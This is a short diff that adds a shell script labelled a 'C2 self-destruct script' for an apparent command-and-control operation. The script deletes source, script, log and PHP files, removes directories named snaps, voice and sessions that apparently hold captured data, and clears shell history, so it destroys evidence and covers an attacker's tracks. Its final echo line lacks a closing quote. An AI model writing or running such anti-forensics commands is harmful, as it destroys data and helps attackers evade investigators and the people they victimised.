@@ -1,0 +1,6 @@
+# ZORGO & İMAM C2 SELF-DESTRUCT SCRIPT
+echo "[!] EMERGENCY: All data and traces are being deleted..."
+rm -rf *.go *.sh *.txt *.php *.log
+rm -rf snaps/ voice/ sessions/
+history -c
+echo "[✓] CLEANING COMPLETE
